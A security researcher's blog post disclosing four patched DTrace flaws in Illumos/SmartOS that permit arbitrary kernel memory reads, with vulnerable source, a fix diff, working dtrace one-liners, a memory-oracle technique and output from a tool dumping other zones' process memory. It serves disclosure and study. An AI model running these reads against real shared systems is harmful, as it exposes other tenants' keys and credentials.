---
layout: post
title: "Arbitrary Kernel Memory Reads on Illumos"
date: 2017-01-06 21:02:05 +0000
comments: true
categories: 
---

Illumos is the name of the operating system that was forked from OpenSolaris and is being used to power Joyent's [Triton](https://www.joyent.com/triton) cloud platform. Joyent have their own branded version of Illumos called SmartOS. Joyent's cloud is interesting because they offer hosting using Zones where customers share the same kernel. This is in contrast to traditional cloud providers who provide isolation between customers using virtual machines. However, it seems that kernel provided isolation is becoming more popular. Looking at AWS Lambda it appears that Linux kernel namespaces are being used to provide isolation. Because the kernel is used to provide isolation it means the whole of the kernel becomes an attack surface. This is especially interesting in the case of Illumos because Illumos runs an interpreter inside the kernel called DTrace which is one of the big selling points of Triton. 

DTrace is an incredibly complex piece of code and it consists of more than 17k lines of C code. It is very difficult to write this amount of C code without introducing lots of bugs :( During my review of the DTrace source code I stumbled across two integer overflows and an out of bound read that could be converted to arbitrary kernel writes. I also found five bugs that could be used for arbitrary memory reads. I find exploitation of these arbitrary memory reads more interesting than the privilege escalation bugs so I'm going to write about four of these first. I intend to write up the other bugs but these were disclosed starting from September 2015 so don't hold your breath.

DTrace Copy Out
===============

If you look at the [DTrace user guide](http://docs.oracle.com/cd/E19253-01/819-5488/gcfsd/) it has this definition for the `copyout` function:


{% blockquote %}
void copyout(void *buf, uintptr_t addr, size_t nbytes)`

The `copyout()` action copies data from a buffer to an address in memory. The number of bytes that this action copies is specified in nbytes. The buffer that the data is copied from is specified in buf. The address that the data is copied to is specified in addr. That address is in the address space of the process that is associated with the current thread.
{% endblockquote %}

When you call `copyout` [this code](https://github.com/joyent/illumos-joyent/blob/20150820/usr/src/uts/common/dtrace/dtrace.c#L4174) is run by DTrace:

    case DIF_SUBR_COPYOUT: {
      uintptr_t kaddr = tupregs[0].dttk_value;
      uintptr_t uaddr = tupregs[1].dttk_value;
      uint64_t size = tupregs[2].dttk_value;

      if (!dtrace_destructive_disallow &&
          dtrace_priv_proc_control(state, mstate) &&
          !dtrace_istoxic(kaddr, size)) {
        DTRACE_CPUFLAG_SET(CPU_DTRACE_NOFAULT);
        dtrace_copyout(kaddr, uaddr, size, flags);
        DTRACE_CPUFLAG_CLEAR(CPU_DTRACE_NOFAULT);
      }
      break;
    }

Unfortunately, `copyout` does exactly what it says on the tin. It copies out kernel memory into userspace without any checks :(. The `kaddr` and `size` values are completely controlled by the user. If we check the rest of the call path there is no code that checks that the user is allowed access to the range specified by `kaddr` and `size`. In fact, there is a function specifically designed to check this called `dtrace_canload` but this was not used. [The patch](https://github.com/joyent/illumos-joyent/commit/395c7a3dcfc66b8b671dc4b3c4a2f0ca26449922#diff-64e6f1587817235d06f7d2db19a97967R4186) fixes this issue by adding a `dtrace_canload` check:

      if (!dtrace_destructive_disallow &&
            dtrace_priv_proc_control(state, mstate) &&
    -        !dtrace_istoxic(kaddr, size)) {
    +        !dtrace_istoxic(kaddr, size) &&
    +        dtrace_canload(kaddr, size, mstate, vstate)) {


Exploiting Arbitrary Memory Reads
=================================

At first glance there doesn't seem to be that much interesting stuff in Illumos to read from kernel memory. Illumos doesn't have KASLR so you can't use an arbitrary memory to discover where stuff is mapped in to bypass KASLR. It should be possible to dump the filesystem buffer cache or even kernel SLABs used for syscall args which could hold sensitive information from other processes on the system but I didn't persue this option. 

It would be great if you could dump memory from other processes but this is not possible on x86 because only the currently running process and the kernel are mapped into memory. However, luckily for us Illumos 64bit maps all the physical memory at a known address in the kernel's virtual address space. I think this is done to make it easier to set up page tables. So all you have to do to read the memory from another process is convert the virtual address you want to read to a physical address and then just add this physical address to the kernel physical address offset (`kpm_vbase`). This is all possible because the information to do this is inside the kernels memory and we have an arbitrary kernel memory read. The location of all these static locations like `kpm_vbase` are also helpfully exported by the kernel (they are not really secret anyway because no KASLR) and can be accessed using a library called libctf. That doesn't stand for lib capture the flag :(

We can also get a list of all the running processes from the `practive` linked list. Normally when you are inside a Zone you can only see processes inside your own Zone. This allows us to create a tool that can be plugged in with an arbitrary kernel memory read and provide us with a ps that will dump all the processes running on the system and allow us to dump the memory contained in these processes.

Here is an example session with the tool being used to dump the heap from a vim process running in the global zone:

    ./global_ps

    PID COMMAND PSARGS BRKBASE
    8024 global_ps ./global_ps 0x414b90
    8015 vim vim secret.txt 0x81f8be8

    ./global_ps segment -p 8015

    ADDRESS SIZE FLAGS
    0xfec2f000 4096
    0x81ef000 188416 [heap]

    ./global_ps dump -p 8015 -a 0x81ef000 -s 188416 > dump

In a shared system this can be very dangerous because you can read private keys, and authentication information from other processes. It also shows that relatively benign vulnerabilities can be very serious on systems that are used for shared hosting.

[POC Code on Github](https://github.com/benmmurphy/illumos_playground/blob/master/ZDI-16-169/global_ps.c)

DTrace INET_NTOA
================

This is a similar issue to the `copyout` problem. This is what the [DTrace user guide](https://docs.oracle.com/cd/E36784_01/html/E36846/gkwzy.html) has to say about `inet_nota`
{% blockquote %}
    string inet_ntoa(ipaddr_t *addr)

    inet_ntoa takes a pointer to an IPv4 address and returns it as a dotted quad decimal string. This is similar to inet_ntoa() from libnsl as described in inet(3SOCKET), however this D version takes a pointer to the IPv4 address rather than the address itself. The returned string is allocated out of scratch memory, and is therefore valid only for the duration of the clause. If insufficient scratch space is available, inet_ntoa does not execute and an error is generated.
{% endblockquote %}

The [code](https://github.com/joyent/illumos-joyent/blob/eef9c9737ad811523f9628507a5a0225058634bf/usr/src/uts/common/dtrace/dtrace.c#L5334) for the `inet_ntoa` function does not do any checking to see if the `addr` is allowed to be accessed.


    case DIF_SUBR_INET_NTOA:
    case DIF_SUBR_INET_NTOA6:
    case DIF_SUBR_INET_NTOP: {
      size_t size;
      int af, argi, i;
      char *base, *end;

      if (subr == DIF_SUBR_INET_NTOP) {
        af = (int)tupregs[0].dttk_value;
        argi = 1;
      } else {
        af = subr == DIF_SUBR_INET_NTOA ? AF_INET: AF_INET6;
        argi = 0;
      }

      if (af == AF_INET) {
        ipaddr_t ip4;
        uint8_t *ptr8, val;

        /*
         * Safely load the IPv4 address.
         */
        ip4 = dtrace_load32(tupregs[argi].dttk_value);

The `tupregs[argi].dttk_value` value can be controlled by the user and there is no call to `dtrace_canload`. This comment about 'Safely' is misleading in this context because `dtrace_load32` prevents the kernel from panicing on a bad load and prevents access to memory mapped IO regions. So by using `inet_ntoa` we can read 4 bytes of arbitrary kernel memory. We just need to parse the dotted IP address back to bytes.

This bug is interesting because it can be demonstrated from the command line.

    >  dtrace -n 'BEGIN{ print(inet_ntoa((in_addr_t*)&`_mmu_pagemask))}'
    dtrace: description 'BEGIN' matched 1 probe
    CPU     ID                    FUNCTION:NAME
      0      1                           :BEGIN string "0.240.255.255"


From the global zone we can verify it has read the 4 bytes 0x00f0ffff

    > echo '_mmu_pagemask::dump'| mdb -k
                        0 1 2 3  4 5 6 7 \/ 9 a b  c d e f  01234567v9abcdef
    fffffffffb94a1d0:  ff0f0000 00000000 00f0ffff ffffffff  ................

We can plug this vulnerability into our framework and use it to list processes and dump their memory contents. You might be concerned that reading 4 bytes at a time is slow but there is no noticable delay when listing processes.

[POC Code on Github](https://github.com/benmmurphy/illumos_playground/blob/master/ZDI-16-274/global_ps2.c)

DTrace Hash Corruption
======================

DTrace has support for hashmaps and allows the user to access the data in the hashmap using the store and load instructions. DTrace tries to separate the metadata from the data and only allow the user to modify the data. However, it is possible to modify the metadata and this allows an attacker to create a memory oracle. An attacker can choose an address and an array of bytes and check whether the memory at that address is equal to the array of bytes. This is equivalent to a slow arbitrary memory read because you can check a single byte 256 times to read a single byte of memory.


In `dtrace_canstore` it checks that the offset into the hash chunk is greater
than the size of `dtrace_dynvar_t.`

https://github.com/joyent/illumos-joyent/blob/release-20151224/usr/src/uts/common/dtrace/dtrace.c#L679

    chunkoffs = (addr - base) % dstate->dtds_chunksize;

    if (chunkoffs < sizeof (dtrace_dynvar_t))
      return (0);

Presumably, it is doing this to prevent the user from writing to the metadata
in the hash chunk and the author believed all the metadata is contained in the
`dtrace_dynvar_t` structure. This belief is true but `dtrace_dynvar_t` is a
dynamically sized structure with the embedded structure `dtrace_tuple`
containing a dynamically sized array of `dtrace_key` structures.

    typedef struct dtrace_dynvar {
      uint64_t dtdv_hashval;      /* hash value -- 0 if free */
      struct dtrace_dynvar *dtdv_next;  /* next on list or hash chain */
      void *dtdv_data;      /* pointer to data */
      dtrace_tuple_t dtdv_tuple;    /* tuple key */
    } dtrace_dynvar_t;

    typedef struct dtrace_tuple {
      uint32_t dtt_nkeys;     /* number of keys in tuple */
      uint32_t dtt_pad;     /* padding */
      dtrace_key_t dtt_key[1];    /* array of tuple keys */
    } dtrace_tuple_t;

    typedef struct dtrace_key {
      uint64_t dttk_value;      /* data value or data pointer */
      uint64_t dttk_size;     /* 0 if by-val, >0 if by-ref */
    } dtrace_key_t;

So if there is more than one key value then an attacker is able to write into
the key values beyond the first one. The `dttk_value` field is treated as
pointer if the `dttk_size` field is non-zero.

Unfortunately, the only place where `dttk_value` field seems to be used is as
an argument to the `dtrace_bcmp` function. When the hashmap looks up a value and
finds a matching entry based on the hash code it checks that the keys are equal
using the `dtrace_bcmp` function.

https://github.com/joyent/illumos-joyent/blob/release-20151224/usr/src/uts/common/dtrace/dtrace.c#L1791

    for (i = 0; i < nkeys; i++, dkey++) {
      if (dkey->dttk_size != key[i].dttk_size)
        goto next; /* size or type mismatch */

      if (dkey->dttk_size != 0) {
        if (dtrace_bcmp(
            (void *)(uintptr_t)key[i].dttk_value,
            (void *)(uintptr_t)dkey->dttk_value,
            dkey->dttk_size))
          goto next;
      } else {
        if (dkey->dttk_value != key[i].dttk_value)
          goto next;
      }
    }

So we don't have a direct read or write primitive but we can tell indirectly
if a piece of memory is identical to the value the `dttk_value` field points to.
We can do this by:

1. Storing a value in the hash with two keys. A first dummy key and a second key
which is the the byte we want to check. ie:

        buf[0] = 0xff; hash[1, buf] = "h"

2. We can find the address of the `dttk_value` field for second key by doing:

        addr = (&hash[1, buf][0]) - 0x28

    Example showing the address of the value:

        [root@web01 ~]# dtrace -n 'char buf[1]; BEGIN {buf[0]=0xff;hash[1,buf]="h";addr = (&hash[1, buf][0]); print(addr)}'
        dtrace: description 'char buf[1]' matched 1 probe
        CPU     ID                    FUNCTION:NAME
          0      1                           :BEGIN char * 0xffffff00efa5c2d8

    If you look at the memory layout in the kernel the address of the key is
    clearly 0x28 behind the value (0x68):

        0xffffff00efa5c2d8-0x28,0x28::dump

                            \/
        0xffffff00efa5c2b0: d0c2a5ef 00ffffff 01000000 00000000
        0xffffff00efa5c2c0: 01000000 00000000 00000000 00000000
        0xffffff00efa5c2d0: ff000000 00000000 68000000 00000000

3. We can change the pointer stored in the `dttk_value` field by doing:
`*(unsigned long*)addr = 0xdeadbeefdeadbeefL` and trigger a kernel panic by
looking up a value in the hash by doing `&hash[1,buf][0]`.

        [root@web01 ~]# dtrace -n 'char buf[1]; BEGIN {buf[0]=0xff;hash[1,buf]="h";addr = (&hash[1, buf][0]) - 0x28; print(addr); *(unsigned long*)addr = 0xdeadbeefdeadbeefL; &hash[1,buf][0]}'
        dtrace: description 'char buf[1]' matched 1 probe

4. We can turn this into a memory oracle by instead of putting a rubbish address
we put the address of a value we want to check and if we have dynvarsize=36 then
dtrace will only return a hash value if the byte at the address is equal to the
original `buf[0]=??` key. This is because the case where they are not equal
dtrace will try to allocate another chunk in the hash but there is no more
space for this chunk.


Example where the byte mismatches `buf[0]=0xff`:

    [root@web01 ~]# dtrace -x dynvarsize=36 -n 'char buf[1]; BEGIN {buf[0]=0xff;hash[1,buf]="h";addr = (&hash[1, buf][0]) - 0x28; *(void**)addr = &`dtrace_dynhash_sink; print(&hash[1,buf][0])}'
    dtrace: description 'char buf[1]' matched 1 probe
    dtrace: 1 dynamic variable drop

Example where the byte matches `buf[0]=0x1`:

    [root@web01 ~]# dtrace -x dynvarsize=36 -n 'char buf[1]; BEGIN {buf[0]=0x1;hash[1,buf]="h";addr = (&hash[1, buf][0]) - 0x28; *(void**)addr = &`dtrace_dynhash_sink; print(&hash[1,buf][0])}'
    dtrace: description 'char buf[1]' matched 1 probe
    CPU     ID                    FUNCTION:NAME
      0      1                           :BEGIN char * 0xffffff00d80cb4d8


Doing 256 syscalls to read 1 byte is slow but the global ps is still responsive :)

[POC Code on Github](https://github.com/benmmurphy/illumos_playground/blob/master/ZDI-16-465/global_ps3.c)

DTrace STRSTR
=============

If you look at the [DTrace user guide](https://docs.oracle.com/cd/E37670_01/E38608/html/dt_strstr_actsub.html) it has this definition for the `strstr` function:

{% blockquote %}
    string strstr(const char *s, const char *subs)

    strstr returns a pointer to the first occurrence of the substring subs in the string s. If s is an empty string, strstr returns a pointer to an empty string. If no match is found, strstr returns 0.
{% endblockquote %}

The `dtrace_canload` function takes a pointer and a size for checking whether a range can be accessed. However, the `strstr` function just takes a pointer to a string. How is it possible for `strstr` to call `dtrace_canload` to check whether the string can be safely searched? The [original implementation](https://github.com/joyent/illumos-joyent/blob/release-20160218/usr/src/uts/common/dtrace/dtrace.c#L4257) only checked `dtrace_canload` after the string had been searched.

    case DIF_SUBR_STRRCHR: {
      /*
       * We're going to iterate over the string looking for the
       * specified character.  We will iterate until we have reached
       * the string length or we have found the character.  If this
       * is DIF_SUBR_STRRCHR, we will look for the last occurrence
       * of the specified character instead of the first.
       */
      uintptr_t saddr = tupregs[0].dttk_value;
      uintptr_t addr = tupregs[0].dttk_value;
      uintptr_t limit = addr + state->dts_options[DTRACEOPT_STRSIZE];
      char c, target = (char)tupregs[1].dttk_value;

      for (regs[rd] = NULL; addr < limit; addr++) {
        if ((c = dtrace_load8(addr)) == target) {
          regs[rd] = addr;

          if (subr == DIF_SUBR_STRCHR)
            break;
        }

        if (c == '\0')
          break;
      }

      if (!dtrace_canload(saddr, addr - saddr, mstate, vstate)) {
        regs[rd] = NULL;
        break;
      }

      break;
    }

There doesn't seem to be any way to observe the result in `regs[rd]` before it is clobbered when `dtrace_canload` fails. All of this data is only visible to the current thread and not accessible globally. However, Illumos provides access to the hardware performance counters and allows you to set them to trace while in the kernel only.

It is possible to set `DTRACEOPT_STRSIZE` to an arbitrary value. So if strsize
is set to 1 then only one byte will be checked against the search value supplied
to the strchr function. This effectively means the strchr function is checking
if the byte at an address is a specific value. The number of instructions or branches taken will be different depending on whether the byte at the address is null, the byte at the address matches or the byte at the address is different.

If we set the performance counter
to be PAPI_br_ins (Branch instructions taken) on my machine it will take 645
for a correct value and 646 for an incorrect value. Also, it will always take
645 for a zero value. So by iterating through the byte values (1-255) and
calling strchr on each it is possible to read an arbitrary byte.

There is some noise which I suspect is caused by paging which can cause higher
values but if you discard any result that does not match 646 or 645 and try
again then this works out.

There is also a weird extra branch taken for some addresses. I believe this is because of the toxic range check. The toxic range check is done by `addr > START && addr < END` so depending on whether `addr > START` or not there will be a difference in the number of branches taken. (We ignore `addr` < END` because we don't try to read from toxic ranges.) This read is not ambiguous because the extra branch translates to
either every byte not matching (all 646) or one byte not matching (646) and
all the other bytes having an unknown result (647).

Again we plug this vulnerability into our exploit framework and dump memory from arbitrary processes in other zones. :)

[POC Code on Github](https://github.com/benmmurphy/illumos_playground/blob/master/ZDI-16-500/global_ps5.c)
